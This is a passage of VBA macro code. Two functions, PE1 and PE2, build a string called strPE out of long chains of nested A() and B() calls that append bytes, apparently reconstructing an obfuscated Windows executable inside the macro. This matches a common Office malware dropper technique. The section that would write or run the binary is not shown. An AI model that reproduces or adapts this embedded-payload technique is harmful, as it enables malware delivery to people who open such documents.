    strPE = A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(strPE, 208), 1), 0), 0), "H"), 137), 149), 216), 1), 0), 0), "H"), 184), 242), 168), 157), "q"), 138), "n"), 175), "'H"), 186), 127), 5), "WY"), 221), "c"), 27), "?H"), 137), 133), 224), 1), 0), 0), "H"), 137), 149), 232), 1), 0), 0), "H"), 184), "qE"), 3)
    strPE = B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(strPE, "l#w"), 203), "_H"), 186), 19), 217), 238), 194), "Dk"), 23), 253), "H"), 137), 133), 240), 1), 0), 0), "H"), 137), 149), 248), 1), 0), 0), "H"), 184), "j"), 176), 179), "y^"), 17), "("), 183), "H"), 186), 147), 13), 138), 203), 188), "f"), 31), "6H")
    strPE = A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 137), 133), 0), 2), 0), 0), "H"), 137), 149), 8), 2), 0), 0), "H"), 184), 228), 237), 22), "N"), 12), "d"), 217), 241), "H"), 186), "j"), 151), 2), 143), 250), "8"), 224), "0H"), 137), 133), 16), 2), 0), 0), "H"), 137), 149), 24), 2), 0), 0), "H"), 184), 154)
    strPE = B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(strPE, 2), 254), 191), "'"), 248), 2), 225), "H"), 186), "."), 161), 195), 207), 10), 185), "n"), 190), "H"), 137), 133), " "), 2), 0), 0), "H"), 137), 149), "("), 2), 0), 0), "H"), 184), 130), 25), "#c"), 140), 227), "G"), 164), "H"), 186), 183), 153), 135), 216), 224), 221), "*")
    strPE = B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(strPE, 127), "H"), 137), 133), "0"), 2), 0), 0), "H"), 137), 149), "8"), 2), 0), 0), "H"), 184), 155), 18), 191), 8), "8>"), 141), 153), "H"), 186), 173), 220), "-"), 225), 255), "w^4H"), 137), 133), "@"), 2), 0), 0), "H"), 137), 149), "H"), 2), 0), 0), "H")
    strPE = A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(strPE, 184), 148), 11), "("), 172), 9), 163), "5"), 222), "H"), 186), "a"), 24), 0), 185), 163), 160), 214), 240), "H"), 137), 133), "P"), 2), 0), 0), "H"), 137), 149), "X"), 2), 0), 0), "H"), 184), "f"), 130), "f"), 232), "a"), 11), 17), "HH"), 186), "L"), 244), 131), 143), 229)
    strPE = A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(strPE, 243), "J"), 19), "H"), 137), 133), "`"), 2), 0), 0), "H"), 137), 149), "h"), 2), 0), 0), "H"), 184), 25), 208), 175), 179), "ze"), 17), "(H"), 186), "7"), 152), "{"), 165), "y"), 176), 9), "AH"), 137), 133), "p"), 2), 0), 0), "H"), 137), 149), "x"), 2), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 0), 199), 133), 128), 2), 0), 0), 193), 202), "y?f"), 199), 133), 132), 2), 0), 0), "E"), 0), 199), 133), 12), 5), 0), 0), 0), 0), 0), 0), 199), 133), 8), 5), 0), 0), 0), 0), 0), 0), 235), "R"), 129), 189), 12), 5), 0), 0), 213), 0)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(strPE, 0), 0), "u"), 10), 199), 133), 12), 5), 0), 0), 0), 0), 0), 0), 139), 133), 8), 5), 0), 0), "H"), 152), 15), 182), 148), 5), 144), 2), 0), 0), 139), 133), 12), 5), 0), 0), "H"), 152), 15), 182), 132), 5), 176), 1), 0), 0), "1"), 194), 139), 133)
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(strPE, 8), 5), 0), 0), "H"), 152), 136), "T"), 5), 176), 131), 133), 12), 5), 0), 0), 1), 131), 133), 8), 5), 0), 0), 1), 139), 133), 8), 5), 0), 0), "="), 254), 1), 0), 0), "v"), 161), "A"), 185), "@"), 0), 0), 0), "A"), 184), 0), 16), 0), 0), 186)
    strPE = A(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 255), 1), 0), 0), 185), 0), 0), 0), 0), "H"), 139), 5), "^"), 200), 0), 0), 255), 208), "H"), 137), 133), 200), 4), 0), 0), "H"), 139), 133), 200), 4), 0), 0), "H"), 137), 194), "H"), 141), "E"), 176), 185), 255), 1), 0), 0), "L"), 139), 0), "L"), 137), 2)
    strPE = A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(B(strPE, "A"), 137), 200), "I"), 1), 208), "M"), 141), "H"), 8), "A"), 137), 200), "I"), 1), 192), "I"), 131), 192), 8), "M"), 139), "@"), 240), "M"), 137), "A"), 240), "L"), 141), "B"), 8), "I"), 131), 224), 248), "L)"), 194), "H)"), 208), 1), 209), 131), 225), 248), 193), 233), 3)
    strPE = B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(strPE, 137), 202), 137), 210), "L"), 137), 199), "H"), 137), 198), "H"), 137), 209), 243), "H"), 165), "H"), 139), 133), 200), 4), 0), 0), 255), 208), 184), 0), 0), 0), 0), "H"), 129), 196), 160), 5), 0), 0), "^_]"), 195), 144), "H"), 131), 236), "(H"), 139), 5), "5")
    strPE = A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "u"), 0), 0), "H"), 139), 0), "H"), 133), 192), "t"), 34), 15), 31), "D"), 0), 0), 255), 208), "H"), 139), 5), 31), "u"), 0), 0), "H"), 141), "P"), 8), "H"), 139), "@"), 8), "H"), 137), 21), 16), "u"), 0), 0), "H"), 133), 192), "u"), 227), "H"), 131), 196), "("), 195)
    strPE = A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(strPE, "f"), 15), 31), "D"), 0), 0), "VSH"), 131), 236), "(H"), 139), 21), 131), 141), 0), 0), "H"), 139), 2), 137), 193), 131), 248), 255), "t9"), 133), 201), "t "), 137), 200), 131), 233), 1), "H"), 141), 28), 194), "H)"), 200), "H"), 141), "t"), 194), 248)
    strPE = A(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 15), 31), "@"), 0), 255), 19), "H"), 131), 235), 8), "H9"), 243), "u"), 245), "H"), 141), 13), "~"), 255), 255), 255), "H"), 131), 196), "([^"), 233), 163), 249), 255), 255), 15), 31), 0), "1"), 192), "f"), 15), 31), "D"), 0), 0), "D"), 141), "@"), 1), 137), 193)
    strPE = A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(strPE, "J"), 131), "<"), 194), 0), "L"), 137), 192), "u"), 240), 235), 173), "f"), 15), 31), "D"), 0), 0), 139), 5), 186), 180), 0), 0), 133), 192), "t"), 6), 195), 15), 31), "D"), 0), 0), 199), 5), 166), 180), 0), 0), 1), 0), 0), 0), 233), "q"), 255), 255), 255), 144)
    strPE = A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "H"), 255), "%i"), 199), 0), 0), 144), 144), 144), 144), 144), 144), 144), 144), 144), "1"), 192), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "H"), 131), 236), "("), 131), 250), 3), "t"), 23), 133), 210), "t"), 19), 184), 1), 0), 0), 0)
    strPE = A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "H"), 131), 196), "("), 195), "f"), 15), 31), 132), 0), 0), 0), 0), 0), 232), 203), 9), 0), 0), 184), 1), 0), 0), 0), "H"), 131), 196), "("), 195), 144), "VSH"), 131), 236), "(H"), 139), 5), 131), 140), 0), 0), 131), "8"), 2), "t"), 6), 199), 0)
    strPE = B(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(strPE, 2), 0), 0), 0), 131), 250), 2), "t"), 19), 131), 250), 1), "tN"), 184), 1), 0), 0), 0), "H"), 131), 196), "([^"), 195), "f"), 144), "H"), 141), 29), "9"), 212), 0), 0), "H"), 141), "52"), 212), 0), 0), "H9"), 222), "t"), 223), 15), 31), "D")
    strPE = A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(A(strPE, 0), 0), "H"), 139), 3), "H"), 133), 192), "t"), 2), 255), 208), "H"), 131), 195), 8), "H9"), 222), "u"), 237), 184), 1), 0), 0), 0), "H"), 131), 196), "([^"), 195), "f"), 15), 31), 132), 0), 0), 0), 0), 0), 232), "K"), 9), 0), 0), 184), 1), 0)
    strPE = B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(strPE, 0), 0), "H"), 131), 196), "([^"), 195), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), 15), 31), "@"), 0), "1"), 192), 195), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "VSH"), 131), 236), "x"), 15), 17), "t$")
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "@"), 15), 17), "|$PD"), 15), 17), "D$`"), 131), "9"), 6), 15), 135), 205), 0), 0), 0), 139), 1), "H"), 141), 21), 236), 134), 0), 0), "Hc"), 4), 130), "H"), 1), 208), 255), 224), 15), 31), 128), 0), 0), 0), 0), "H"), 141), 29), 135)
    strPE = A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(strPE, 134), 0), 0), 242), "D"), 15), 16), "A "), 242), 15), 16), "y"), 24), 242), 15), 16), "q"), 16), "H"), 139), "q"), 8), 185), 2), 0), 0), 0), 232), 3), "b"), 0), 0), 242), "D"), 15), 17), "D$0I"), 137), 216), "H"), 141), 21), "z"), 134), 0), 0)
    strPE = A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 242), 15), 17), "|$(H"), 137), 193), "I"), 137), 241), 242), 15), 17), "t$ "), 232), "+\"), 0), 0), 144), 15), 16), "t$@"), 15), 16), "|$P1"), 192), "D"), 15), 16), "D$`H"), 131), 196), "x[^"), 195), 144)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "H"), 141), 29), "Y"), 133), 0), 0), 235), 150), 15), 31), 128), 0), 0), 0), 0), "H"), 141), 29), 137), 133), 0), 0), 235), 134), 15), 31), 128), 0), 0), 0), 0), "H"), 141), 29), "Y"), 133), 0), 0), 233), "s"), 255), 255), 255), 15), 31), "@"), 0), "H"), 141)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(strPE, 29), 185), 133), 0), 0), 233), "c"), 255), 255), 255), 15), 31), "@"), 0), "H"), 141), 29), 129), 133), 0), 0), 233), "S"), 255), 255), 255), "H"), 141), 29), 253), 132), 0), 0), 233), "G"), 255), 255), 255), 144), 144), 144), 144), 144), 144), 144), 144), 219), 227), 195), 144)
    strPE = B(A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), 144), "ATSH"), 131), 236), "8I"), 137), 204), "H"), 141), "D$X"), 185), 2), 0), 0), 0), "H"), 137), "T$XL"), 137), "D$`L"), 137), "L$hH"), 137), "D")
    strPE = A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(strPE, "$("), 232), "#a"), 0), 0), "A"), 184), 27), 0), 0), 0), 186), 1), 0), 0), 0), "H"), 141), 13), 225), 133), 0), 0), "I"), 137), 193), 232), "A["), 0), 0), "H"), 139), "\$("), 185), 2), 0), 0), 0), 232), 250), "`"), 0), 0), "L"), 137)
    strPE = A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(B(A(strPE, 226), "H"), 137), 193), "I"), 137), 216), 232), 212), "Z"), 0), 0), 232), "O["), 0), 0), 144), "f"), 15), 31), "D"), 0), 0), "ATVSH"), 131), 236), "PHc"), 29), 165), 178), 0), 0), "I"), 137), 204), 133), 219), 15), 142), 22), 1), 0), 0)
    strPE = A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(strPE, "H"), 139), 5), 151), 178), 0), 0), "1"), 201), "H"), 131), 192), 24), "f"), 15), 31), 132), 0), 0), 0), 0), 0), "H"), 139), 16), "L9"), 226), "w"), 20), "L"), 139), "@"), 8), "E"), 139), "@"), 8), "L"), 1), 194), "I9"), 212), 15), 130), 135), 0), 0), 0)
    strPE = B(A(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(strPE, 131), 193), 1), "H"), 131), 192), "(9"), 217), "u"), 217), "L"), 137), 225), 232), "Q"), 9), 0), 0), "H"), 137), 198), "H"), 133), 192), 15), 132), 231), 0), 0), 0), "H"), 139), 5), "F"), 178), 0), 0), "H"), 141), 28), 155), "H"), 193), 227), 3), "H"), 1), 216), "H")
    strPE = B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(strPE, 137), "p "), 199), 0), 0), 0), 0), 0), 232), "T"), 10), 0), 0), 139), "N"), 12), "H"), 141), "T$ A"), 184), "0"), 0), 0), 0), "H"), 1), 193), "H"), 139), 5), 20), 178), 0), 0), "H"), 137), "L"), 24), 24), 255), 21), 9), 196), 0), 0), "H")
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(strPE, 133), 192), 15), 132), 127), 0), 0), 0), 139), "D$D"), 141), "P"), 192), 131), 226), 191), "t"), 8), 141), "P"), 252), 131), 226), 251), "u"), 20), 131), 5), 225), 177), 0), 0), 1), "H"), 131), 196), "P[^A\"), 195), 15), 31), "@"), 0), 131), 248)
    strPE = A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(strPE, 2), "H"), 139), "L$ H"), 139), "T$8A"), 184), 4), 0), 0), 0), 184), "@"), 0), 0), 0), "D"), 15), "E"), 192), "H"), 3), 29), 181), 177), 0), 0), "H"), 137), "K"), 8), "I"), 137), 217), "H"), 137), "S"), 16), 255), 21), 156), 195), 0), 0)

    PE1 = strPE
End Function

Private Function PE2() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(strPE, 133), 192), "u"), 180), 255), 21), "*"), 195), 0), 0), "H"), 141), 13), 3), 133), 0), 0), 137), 194), 232), "d"), 254), 255), 255), 15), 31), "@"), 0), "1"), 219), 233), " "), 255), 255), 255), "H"), 139), 5), "z"), 177), 0), 0), 139), "V"), 8), "H"), 141), 13), 168), 132)
    strPE = B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(strPE, 0), 0), "L"), 139), "D"), 24), 24), 232), ">"), 254), 255), 255), "L"), 137), 226), "H"), 141), 13), "t"), 132), 0), 0), 232), "/"), 254), 255), 255), 144), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), 15), 31), 0), "UAWAVAUA")
    strPE = A(A(A(A(B(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(strPE, "TWVSH"), 131), 236), "8H"), 141), 172), "$"), 128), 0), 0), 0), 139), "="), 34), 177), 0), 0), 133), 255), "t"), 22), "H"), 141), "e"), 184), "[^_A\A]A^A_]"), 195), 15), 31), "D"), 0), 0), 199), 5)
    strPE = A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(strPE, 254), 176), 0), 0), 1), 0), 0), 0), 232), "y"), 8), 0), 0), "H"), 152), "H"), 141), 4), 128), "H"), 141), 4), 197), 15), 0), 0), 0), "H"), 131), 224), 240), 232), 162), 10), 0), 0), "L"), 139), "%"), 203), 136), 0), 0), "H"), 139), 29), 212), 136), 0), 0)
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(strPE, 199), 5), 206), 176), 0), 0), 0), 0), 0), 0), "H)"), 196), "H"), 141), "D$ H"), 137), 5), 195), 176), 0), 0), "L"), 137), 224), "H)"), 216), "H"), 131), 248), 7), "~"), 145), 139), 19), "H"), 131), 248), 11), 15), 143), "+"), 1), 0), 0), 133)
    strPE = A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(strPE, 210), 15), 133), 155), 1), 0), 0), 139), "C"), 4), 133), 192), 15), 133), 144), 1), 0), 0), 139), "S"), 8), 131), 250), 1), 15), 133), 197), 1), 0), 0), "H"), 131), 195), 12), "L9"), 227), 15), 131), "Y"), 255), 255), 255), "L"), 139), "-"), 144), 136), 0), 0)
    strPE = B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(strPE, "I"), 190), 0), 0), 0), 0), 255), 255), 255), 255), 235), "1"), 15), 31), "@"), 0), 15), 182), 22), "H"), 137), 241), "I"), 137), 208), "I"), 129), 200), 0), 255), 255), 255), 132), 210), "I"), 15), "H"), 208), "H)"), 194), "I"), 1), 215), 232), 143), 253), 255), 255), "D")
    strPE = A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(strPE, 136), ">H"), 131), 195), 12), "L9"), 227), "sc"), 139), 3), 139), "s"), 4), 15), 182), "S"), 8), "L"), 1), 232), "L"), 1), 238), "L"), 139), "8"), 131), 250), " "), 15), 132), 240), 0), 0), 0), 15), 135), 194), 0), 0), 0), 131), 250), 8), "t"), 173), 131)
    strPE = B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(strPE, 250), 16), 15), 133), "9"), 1), 0), 0), 15), 183), 22), "H"), 137), 241), "I"), 137), 208), "I"), 129), 200), 0), 0), 255), 255), "f"), 133), 210), "I"), 15), "H"), 208), "H"), 131), 195), 12), "H)"), 194), "I"), 1), 215), 232), "."), 253), 255), 255), "fD"), 137), ">")
    strPE = B(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(B(A(B(strPE, "L9"), 227), "r"), 162), 15), 31), "D"), 0), 0), 139), 5), 206), 175), 0), 0), 133), 192), 15), 142), 164), 254), 255), 255), "H"), 139), "5"), 187), 193), 0), 0), "1"), 219), "L"), 141), "e"), 172), 15), 31), "D"), 0), 0), "H"), 139), 5), 177), 175), 0), 0), "H")
    strPE = A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(strPE, 1), 216), "D"), 139), 0), "E"), 133), 192), "t"), 13), "H"), 139), "P"), 16), "H"), 139), "H"), 8), "M"), 137), 225), 255), 214), 131), 199), 1), "H"), 131), 195), "(;="), 136), 175), 0), 0), "|"), 210), 233), "_"), 254), 255), 255), 15), 31), "D"), 0), 0), 133), 210)
    strPE = A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(strPE, "ut"), 139), "C"), 4), 137), 193), 11), "K"), 8), 15), 133), 206), 254), 255), 255), 139), "S"), 12), "H"), 131), 195), 12), 233), 183), 254), 255), 255), "f."), 15), 31), 132), 0), 0), 0), 0), 0), 131), 250), "@"), 15), 133), "|"), 0), 0), 0), "H"), 139), 22)
    strPE = A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(strPE, "H"), 137), 241), "H)"), 194), "I"), 1), 215), 232), 134), 252), 255), 255), "L"), 137), ">"), 233), 242), 254), 255), 255), "f"), 15), 31), "D"), 0), 0), 139), 22), "H"), 137), 209), "L"), 9), 242), 133), 201), "H"), 15), "I"), 209), "H"), 137), 241), "H)"), 194), "I"), 1)
    strPE = B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(strPE, 215), 232), "\"), 252), 255), 255), "D"), 137), ">"), 233), 200), 254), 255), 255), 15), 31), "@"), 0), "L9"), 227), 15), 131), 217), 253), 255), 255), "L"), 139), "5"), 16), 135), 0), 0), 139), "s"), 4), "D"), 139), "+H"), 131), 195), 8), "L"), 1), 246), "D"), 3), ".")
    strPE = A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "H"), 137), 241), 232), "("), 252), 255), 255), "D"), 137), ".L9"), 227), "r"), 224), 233), 251), 254), 255), 255), "H"), 141), 13), 156), 130), 0), 0), 232), 159), 251), 255), 255), "H"), 141), 13), "X"), 130), 0), 0), 232), 147), 251), 255), 255), 144), 144), 144), "H"), 131)
    strPE = A(B(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(strPE, 236), "XH"), 139), 5), 181), 174), 0), 0), "H"), 133), 192), "t,"), 242), 15), 16), 132), "$"), 128), 0), 0), 0), 137), "L$ H"), 141), "L$ H"), 137), "T$("), 242), 15), 17), "T$0"), 242), 15), 17), "\$8"), 242)
    strPE = B(A(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(strPE, 15), 17), "D$@"), 255), 208), 144), "H"), 131), 196), "X"), 195), "ff."), 15), 31), 132), 0), 0), 0), 0), 0), 15), 31), "@"), 0), "H"), 137), 13), "i"), 174), 0), 0), 233), 28), "W"), 0), 0), 144), 144), 144), 144), "ATH"), 131), 236), " ")
    strPE = A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(strPE, "H"), 139), 17), 139), 2), "I"), 137), 204), 137), 193), 129), 225), 255), 255), 255), " "), 129), 249), "CCG "), 15), 132), 190), 0), 0), 0), "="), 150), 0), 0), 192), 15), 135), 154), 0), 0), 0), "="), 139), 0), 0), 192), "vD"), 5), "s"), 255), 255)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(A(B(strPE, "?"), 131), 248), 9), "w*H"), 141), 21), 27), 130), 0), 0), "Hc"), 4), 130), "H"), 1), 208), 255), 224), "f"), 144), 186), 1), 0), 0), 0), 185), 8), 0), 0), 0), 232), "1V"), 0), 0), 232), 188), 250), 255), 255), 15), 31), "@"), 0), 184), 255)
    strPE = A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(strPE, 255), 255), 255), "H"), 131), 196), " A\"), 195), 15), 31), "@"), 0), "="), 5), 0), 0), 192), 15), 132), 221), 0), 0), 0), "v;="), 8), 0), 0), 192), "t"), 220), "="), 29), 0), 0), 192), "u41"), 210), 185), 4), 0), 0), 0), 232), 241)
    strPE = A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(B(strPE, "U"), 0), 0), "H"), 131), 248), 1), 15), 132), 227), 0), 0), 0), "H"), 133), 192), "t"), 25), 185), 4), 0), 0), 0), 255), 208), 184), 255), 255), 255), 255), 235), 177), 15), 31), "@"), 0), "="), 2), 0), 0), 128), "t"), 161), "H"), 139), 5), 178), 173), 0), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(strPE, "H"), 133), 192), "t"), 29), "L"), 137), 225), "H"), 131), 196), " A\H"), 255), 224), 144), 246), "B"), 4), 1), 15), 133), "8"), 255), 255), 255), 233), "y"), 255), 255), 255), 144), "1"), 192), "H"), 131), 196), " A\"), 195), 15), 31), 128), 0), 0), 0), 0)
    strPE = A(B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(strPE, "1"), 210), 185), 8), 0), 0), 0), 232), 132), "U"), 0), 0), "H"), 131), 248), 1), 15), 132), ":"), 255), 255), 255), "H"), 133), 192), "t"), 172), 185), 8), 0), 0), 0), 255), 208), 184), 255), 255), 255), 255), 233), "A"), 255), 255), 255), 15), 31), "@"), 0), "1"), 210)
